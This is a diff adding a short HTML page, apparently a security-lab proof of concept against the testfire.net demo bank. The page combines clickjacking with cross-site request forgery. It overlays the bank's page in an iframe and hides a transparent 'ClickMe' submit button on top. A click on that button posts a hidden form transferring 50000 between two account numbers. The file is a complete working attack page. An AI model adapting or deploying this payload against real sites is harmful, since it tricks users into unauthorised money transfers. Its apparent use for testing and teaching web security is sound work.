@@ -1,0 +1,25 @@
+<html>
+<body>
+<style>
+iframe{
+        height:100%;
+        width:100%;
+        position:absolute;
+        opacity:1;
+        top:0; left:0;
+        background:white;
+        z-index:999;
+}
+</style>
+
+<h1 style="position:absolute;top:0;left:0;z-index:1000;">Corwin</h1>
+<form name="demo"action="https://demo.testfire.net/bank/doTransfer" method="POST">
+<input type="hidden" name="fromAccount" value="800002">
+<input type="hidden" name="toAccount" value="800003">
+<input type="hidden" name="transferAmount" value="50000">
+<input type="submit" name="transfer" value="ClickMe" style="position:absolute;z-index:1000;top:220px;left:831px;opacity:0;">
+</form>
+<iframe src="https://demo.testfire.net/bank/main.jsp" height=500px width=500px>
+</iframe>
+</body>
+</html>
